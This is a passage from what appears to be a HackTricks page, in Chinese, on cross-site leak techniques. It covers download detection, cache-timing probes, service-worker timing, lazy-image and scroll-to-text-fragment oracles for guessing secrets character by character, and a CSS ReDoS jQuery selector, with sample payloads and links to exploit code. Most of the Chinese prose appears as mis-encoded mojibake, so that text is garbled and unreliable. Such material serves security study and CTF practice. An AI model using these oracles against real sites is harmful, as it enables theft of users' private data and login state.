* é€šè¿‡ç›‘æ§çª—å£é«˜åº¦çš„å˜åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥æ¨æ–­ä¸‹è½½æ çš„å‡ºç°ï¼Œè¡¨æ˜å·²å¯åŠ¨ä¸‹è½½ã€‚

2. **ä½¿ç”¨iframesè¿›è¡Œä¸‹è½½å¯¼èˆª**ï¼š

* å½“é¡µé¢ä½¿ç”¨`Content-Disposition: attachment`å¤´è§¦å‘æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œä¸ä¼šå¼•èµ·å¯¼èˆªäº‹ä»¶ã€‚
* é€šè¿‡åœ¨iframeä¸­åŠ è½½å†…å®¹å¹¶ç›‘æ§å¯¼èˆªäº‹ä»¶ï¼Œå¯ä»¥æ£€æŸ¥å†…å®¹è®¾ç½®æ˜¯å¦å¯¼è‡´æ–‡ä»¶ä¸‹è½½ï¼ˆæ— å¯¼èˆªï¼‰ã€‚

3. **ä¸ä½¿ç”¨iframesè¿›è¡Œä¸‹è½½å¯¼èˆª**ï¼š

* ç±»ä¼¼äºiframeæŠ€æœ¯ï¼Œæ­¤æ–¹æ³•æ¶‰åŠä½¿ç”¨`window.open`è€Œä¸æ˜¯iframeã€‚
* ç›‘æ§æ–°æ‰“å¼€çª—å£ä¸­çš„å¯¼èˆªäº‹ä»¶å¯ä»¥æ­ç¤ºæ–‡ä»¶ä¸‹è½½æ˜¯å¦è¢«è§¦å‘ï¼ˆæ— å¯¼èˆªï¼‰ï¼Œæˆ–è€…å†…å®¹æ˜¯å¦å†…è”æ˜¾ç¤ºï¼ˆå‘ç”Ÿå¯¼èˆªï¼‰ã€‚

åœ¨åªæœ‰å·²ç™»å½•ç”¨æˆ·å¯ä»¥è§¦å‘æ­¤ç±»ä¸‹è½½çš„æƒ…å†µä¸‹ï¼Œè¿™äº›æŠ€æœ¯å¯ä»¥ç”¨äºé—´æ¥æ¨æ–­ç”¨æˆ·çš„èº«ä»½éªŒè¯çŠ¶æ€ï¼Œæ ¹æ®æµè§ˆå™¨å¯¹ä¸‹è½½è¯·æ±‚çš„å“åº”ã€‚

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨iframesæ¥è¯†åˆ«æ–‡ä»¶ä¸‹è½½ï¼›iframeçš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æ–‡ä»¶ä¸‹è½½æˆåŠŸã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722)ï¼ˆæ¥è‡ª[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰

{% hint style="warning" %}
è¿™å°±æ˜¯è¿™ç§æŠ€æœ¯æœ‰è¶£çš„åŸå› ï¼šChromeç°åœ¨å…·æœ‰**ç¼“å­˜åˆ†åŒº**ï¼Œæ–°æ‰“å¼€é¡µé¢çš„ç¼“å­˜é”®æ˜¯ï¼š`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`ï¼Œä½†å¦‚æœæˆ‘æ‰“å¼€ä¸€ä¸ªngroké¡µé¢å¹¶åœ¨å…¶ä¸­ä½¿ç”¨fetchï¼Œç¼“å­˜é”®å°†æ˜¯ï¼š`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ï¼Œ**ç¼“å­˜é”®ä¸åŒ**ï¼Œå› æ­¤æ— æ³•å…±äº«ç¼“å­˜ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š[é€šè¿‡åˆ†åŒºç¼“å­˜è·å¾—å®‰å…¨æ€§å’Œéšç§æ€§](https://developer.chrome.com/blog/http-cache-partitioning/)\
ï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰
{% endhint %}

å¦‚æœç«™ç‚¹`example.com`åŒ…å«æ¥è‡ª`*.example.com/resource`çš„èµ„æºï¼Œåˆ™è¯¥èµ„æºå°†ä¸ç›´æ¥é€šè¿‡é¡¶çº§å¯¼èˆªè¯·æ±‚èµ„æºå…·æœ‰**ç›¸åŒçš„ç¼“å­˜é”®**ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜é”®ç”±é¡¶çº§\_eTLD+1\_å’Œframe \_eTLD+1\_ç»„æˆã€‚

ç”±äºè®¿é—®ç¼“å­˜æ¯”åŠ è½½èµ„æºæ›´å¿«ï¼Œå¯ä»¥å°è¯•æ›´æ”¹é¡µé¢çš„ä½ç½®å¹¶åœ¨åœæ­¢åå–æ¶ˆ20æ¯«ç§’ï¼ˆä¾‹å¦‚ï¼‰åã€‚å¦‚æœåœæ­¢åæ›´æ”¹äº†æ¥æºï¼Œè¿™æ„å‘³ç€èµ„æºå·²è¢«ç¼“å­˜ã€‚\
æˆ–è€…åªéœ€**å‘å¯èƒ½å·²ç¼“å­˜çš„é¡µé¢å‘é€ä¸€äº›fetchå¹¶æµ‹é‡åŠ è½½æ‰€éœ€çš„æ—¶é—´**ã€‚

### æ‰‹åŠ¨é‡å®šå‘ <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** å¯ä»¥æŸ¥æ˜å¯¹fetchè¯·æ±‚çš„å“åº”æ˜¯å¦æ˜¯é‡å®šå‘
* **Code Example**:

![](<../../.gitbook/assets/image (652).png>)

### ä½¿ç”¨AbortControllerè¿›è¡Œfetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** å¯ä»¥å°è¯•åŠ è½½èµ„æºå¹¶åœ¨åŠ è½½ä¹‹å‰ä¸­æ­¢åŠ è½½ï¼Œæ ¹æ®æ˜¯å¦è§¦å‘é”™è¯¯æ¥åˆ¤æ–­èµ„æºæ˜¯å¦å·²ç¼“å­˜ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

ä½¿ç”¨\_fetch\_å’Œ\_setTimeout\_ä¸**AbortController**æ¥æ£€æµ‹èµ„æºæ˜¯å¦å·²ç¼“å­˜ï¼Œå¹¶ä»æµè§ˆå™¨ç¼“å­˜ä¸­æ¸…é™¤ç‰¹å®šèµ„æºã€‚æ­¤å¤–ï¼Œè¯¥è¿‡ç¨‹åœ¨ä¸ç¼“å­˜æ–°å†…å®¹çš„æƒ…å†µä¸‹è¿›è¡Œã€‚

### è„šæœ¬æ±¡æŸ“

* **åŒ…å«æ–¹æ³•**: HTMLå…ƒç´ ï¼ˆscriptï¼‰
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **æ‘˜è¦:** å¯ä»¥**è¦†ç›–å†…ç½®å‡½æ•°**å¹¶è¯»å–å®ƒä»¬çš„å‚æ•°ï¼Œå³ä½¿æ¥è‡ª**è·¨æºè„šæœ¬**ï¼ˆæ— æ³•ç›´æ¥è¯»å–ï¼‰ï¼Œè¿™å¯èƒ½ä¼š**æ³„éœ²æœ‰ä»·å€¼çš„ä¿¡æ¯**ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### æœåŠ¡å·¥ä½œè€… <a href="#service-workers" id="service-workers"></a>

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **æ‘˜è¦:** ä½¿ç”¨æœåŠ¡å·¥ä½œè€…æµ‹é‡ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**:

åœ¨ç»™å®šçš„åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…ä¸»åŠ¨æ³¨å†Œä¸€ä¸ª**æœåŠ¡å·¥ä½œè€…**åœ¨ä»–ä»¬çš„ä¸€ä¸ªåŸŸä¸­ï¼Œå…·ä½“æ¥è¯´æ˜¯"attacker.com"ã€‚æ¥ä¸‹æ¥ï¼Œæ”»å‡»è€…ä»ä¸»æ–‡æ¡£ä¸­æ‰“å¼€ç›®æ ‡ç½‘ç«™çš„ä¸€ä¸ªæ–°çª—å£ï¼Œå¹¶æŒ‡ç¤º**æœåŠ¡å·¥ä½œè€…**å¯åŠ¨è®¡æ—¶å™¨ã€‚å½“æ–°çª—å£å¼€å§‹åŠ è½½æ—¶ï¼Œæ”»å‡»è€…å¯¼èˆªåˆ°åœ¨å‰ä¸€æ­¥éª¤ä¸­è·å¾—çš„å¼•ç”¨ï¼Œè¯¥å¼•ç”¨ç”±**æœåŠ¡å·¥ä½œè€…**ç®¡ç†çš„é¡µé¢ã€‚

åœ¨å‰ä¸€æ­¥éª¤ä¸­å‘èµ·çš„è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œ**æœåŠ¡å·¥ä½œè€…**ä»¥\*\*204ï¼ˆæ— å†…å®¹ï¼‰\*\*çŠ¶æ€ä»£ç åšå‡ºå“åº”ï¼Œæœ‰æ•ˆåœ°ç»ˆæ­¢å¯¼èˆªè¿‡ç¨‹ã€‚æ­¤æ—¶ï¼Œ**æœåŠ¡å·¥ä½œè€…**ä»å‰ä¸¤æ­¥ä¸­å¯åŠ¨çš„è®¡æ—¶å™¨ä¸­æ•è·ä¸€ä¸ªæµ‹é‡ã€‚è¿™ä¸ªæµ‹é‡å—åˆ°å¯¼èˆªè¿‡ç¨‹ä¸­ç”±JavaScriptå¼•èµ·çš„å»¶è¿ŸæŒç»­æ—¶é—´çš„å½±å“ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤** **ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### è·å–æ—¶é—´

* **åŒ…å«æ–¹æ³•**: è·å–API
* **å¯æ£€æµ‹å·®å¼‚**: æ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ä»£ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **æ‘˜è¦:** ä½¿ç”¨[performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow)æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### è·¨çª—å£æ—¶é—´

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: æ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ä»£ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **æ‘˜è¦:** ä½¿ç”¨[performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow)æ¥æµ‹é‡ä½¿ç”¨`window.open`æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä½¿ç”¨HTMLæˆ–é‡æ–°æ³¨å…¥

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä»è·¨æºHTMLä¸­**æ³¨å…¥HTMLå†…å®¹**ä¸­çªå‡ºä¿¡æ¯çš„æŠ€æœ¯ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥**æ³¨å…¥HTMLä½†æ— æ³•æ³¨å…¥JSä»£ç **æ—¶ï¼Œè¿™äº›æŠ€æœ¯éå¸¸æœ‰è¶£ã€‚

### æ‚¬æŒ‚æ ‡è®°

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### å›¾åƒå»¶è¿ŸåŠ è½½

å¦‚æœæ‚¨éœ€è¦**çªƒå–å†…å®¹**å¹¶ä¸”å¯ä»¥**åœ¨ç§˜å¯†ä¹‹å‰æ·»åŠ HTML**ï¼Œåˆ™åº”æ£€æŸ¥**å¸¸è§çš„æ‚¬æŒ‚æ ‡è®°æŠ€æœ¯**ã€‚\
ä½†æ˜¯ï¼Œå¦‚æœå‡ºäºä»»ä½•åŸå› æ‚¨**å¿…é¡»**é€ä¸ªå­—ç¬¦æ‰§è¡Œï¼ˆä¹Ÿè®¸é€šä¿¡æ˜¯é€šè¿‡ç¼“å­˜å‘½ä¸­ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ­¤æŠ€å·§ã€‚

HTMLä¸­çš„**å›¾åƒ**æœ‰ä¸€ä¸ªâ€œ**loading**â€å±æ€§ï¼Œå…¶å€¼å¯ä»¥æ˜¯â€œ**lazy**â€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå›¾åƒå°†åœ¨æŸ¥çœ‹æ—¶åŠ è½½ï¼Œè€Œä¸æ˜¯åœ¨é¡µé¢åŠ è½½æ—¶åŠ è½½:

```html
<img src=/something loading=lazy >
```

å› æ­¤ï¼Œæ‚¨å¯ä»¥**æ·»åŠ å¤§é‡çš„åƒåœ¾å­—ç¬¦**ï¼ˆä¾‹å¦‚**æˆåƒä¸Šä¸‡ä¸ª"W"**ï¼‰æ¥**å¡«å……ç½‘é¡µ**ï¼Œä½¿å…¶åœ¨ç§˜å¯†ä¿¡æ¯ä¹‹å‰æˆ–ä¹‹åæ·»åŠ ç±»ä¼¼äº\*\*`<br><canvas height="1850px"></canvas><br>`**çš„å†…å®¹ã€‚**\
**å› æ­¤ï¼Œå¦‚æœä¾‹å¦‚æˆ‘ä»¬çš„**æ³¨å…¥å‡ºç°åœ¨æ ‡å¿—ä¹‹å‰\*\*ï¼Œåˆ™**å›¾åƒ**å°†ä¼š**åŠ è½½**ï¼Œä½†å¦‚æœå‡ºç°åœ¨**æ ‡å¿—ä¹‹å**ï¼Œæ ‡å¿—å’Œåƒåœ¾å­—ç¬¦å°†**é˜»æ­¢å…¶åŠ è½½**ï¼ˆæ‚¨éœ€è¦è°ƒæ•´æ”¾ç½®å¤šå°‘åƒåœ¾å­—ç¬¦ï¼‰ã€‚è¿™å°±æ˜¯åœ¨[**è¿™ç¯‡æ–‡ç« **](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­å‘ç”Ÿçš„æƒ…å†µã€‚

å¦ä¸€ä¸ªé€‰æ‹©æ˜¯ä½¿ç”¨**scroll-to-text-fragment**ï¼ˆå¦‚æœå…è®¸ï¼‰ï¼š

#### æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ

ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥è®©**æœºå™¨äººè®¿é—®é¡µé¢**ï¼Œä¾‹å¦‚ï¼š

```
#:~:text=SECR
```

æ‰€ä»¥ç½‘é¡µå°†æ˜¯è¿™æ ·çš„ï¼š**`https://victim.com/post.html#:~:text=SECR`**

å…¶ä¸­post.htmlåŒ…å«æ”»å‡»è€…çš„åƒåœ¾å­—ç¬¦å’Œå»¶è¿ŸåŠ è½½å›¾åƒï¼Œç„¶åæœºå™¨äººçš„ç§˜å¯†è¢«æ·»åŠ ã€‚

è¿™æ®µæ–‡æœ¬çš„ä½œç”¨æ˜¯è®©æœºå™¨äººè®¿é—®é¡µé¢ä¸­åŒ…å«æ–‡æœ¬`SECR`çš„ä»»ä½•æ–‡æœ¬ã€‚ç”±äºè¯¥æ–‡æœ¬æ˜¯ç§˜å¯†ï¼Œè€Œä¸”å®ƒå°±åœ¨**å›¾åƒä¸‹æ–¹**ï¼Œ**åªæœ‰åœ¨çŒœæµ‹çš„ç§˜å¯†æ­£ç¡®æ—¶å›¾åƒæ‰ä¼šåŠ è½½**ã€‚å› æ­¤ï¼Œæ‚¨æœ‰äº†**é€ä¸ªå­—ç¬¦çªƒå–ç§˜å¯†çš„ç¥è°•**ã€‚

ä¸€äº›åˆ©ç”¨æ­¤æ¼æ´çš„ä»£ç ç¤ºä¾‹ï¼š[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### å›¾åƒå»¶è¿ŸåŠ è½½åŸºäºæ—¶é—´

å¦‚æœ**æ— æ³•åŠ è½½å¤–éƒ¨å›¾åƒ**ï¼Œè¿™å¯èƒ½è¡¨æ˜æ”»å‡»è€…å›¾åƒå·²åŠ è½½ï¼Œå¦ä¸€ä¸ªé€‰æ‹©æ˜¯å°è¯•**å¤šæ¬¡çŒœæµ‹å­—ç¬¦å¹¶æµ‹é‡æ—¶é—´**ã€‚å¦‚æœåŠ è½½äº†å›¾åƒï¼Œæ‰€æœ‰è¯·æ±‚å°†æ¯”æœªåŠ è½½å›¾åƒæ—¶èŠ±è´¹æ›´é•¿çš„æ—¶é—´ã€‚è¿™å°±æ˜¯[**æ­¤è§£å†³æ–¹æ¡ˆçš„å†™ä½œæ€»ç»“**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼š

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

å¦‚æœä½¿ç”¨`jQuery(location.hash)`ï¼Œå¯ä»¥é€šè¿‡è®¡æ—¶æ¥æ‰¾å‡ºæ˜¯å¦å­˜åœ¨æŸäº›HTMLå†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœé€‰æ‹©å™¨`main[id='site-main']`ä¸åŒ¹é…ï¼Œåˆ™æ— éœ€æ£€æŸ¥å…¶ä½™çš„**é€‰æ‹©å™¨**ï¼š

```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```

### CSSæ³¨å…¥

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## é˜²å¾¡

å»ºè®®åœ¨[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)ä¸­æä¾›äº†ç¼“è§£æªæ–½ï¼ŒåŒæ—¶åœ¨[https://xsleaks.dev/](https://xsleaks.dev/)çš„æ¯ä¸ªéƒ¨åˆ†ä¸­ä¹Ÿæœ‰ã€‚è¯·æŸ¥çœ‹è¿™äº›ä¿¡æ¯ä»¥äº†è§£å¦‚ä½•é˜²èŒƒè¿™äº›æŠ€æœ¯ã€‚

## å‚è€ƒèµ„æ–™

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
